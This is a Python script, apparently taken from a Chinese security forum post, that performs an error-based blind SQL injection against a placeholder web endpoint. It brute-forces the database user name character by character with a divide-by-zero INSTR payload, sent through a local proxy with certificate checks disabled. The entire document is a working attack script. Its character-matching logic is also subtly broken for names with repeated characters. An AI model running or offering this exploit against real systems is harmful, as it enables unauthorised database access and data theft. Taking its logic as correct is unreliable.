import requests
from requests.exceptions import RequestException

# 配置目标 URL 和参数名
url = "http://target.com/vulnerable_endpoint"
param_name = "param"

# 配置代理（如果需要）
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# 配置请求头
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Content-Type": "application/x-www-form-urlencoded"  # 根据需要调整 Content-Type
}

# 配置字符集和最大长度
charset = "abcdefghijklmnopqrstuvwxyz0123456789"
max_length = 20  # 假设用户名最大长度为20

# 初始化用户名
user_name = ""

# 忽略 SSL 证书警告
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# 爆破用户名
for position in range(1, max_length + 1):
    for char in charset:
        payload = f"' || 1/({position}-INSTR(USER,'{char}')) || '"
        data = {param_name: payload}

        try:
            response = requests.post(
                url,
                data=data,
                headers=headers,
                proxies=proxies,
                verify=False,  # 忽略 SSL 证书
                timeout=10,  # 设置超时
                allow_redirects=False  # 禁止重定向
            )

            # 检查响应是否包含错误信息
            if "error" in response.text:
                user_name += char
                print(f"Found character: {char} at position: {position}")
                break

        except RequestException as e:
            print(f"Request failed: {e}")

print(f"Database user name: {user_name}")

# From https://forum.butian.net/share/3078
#
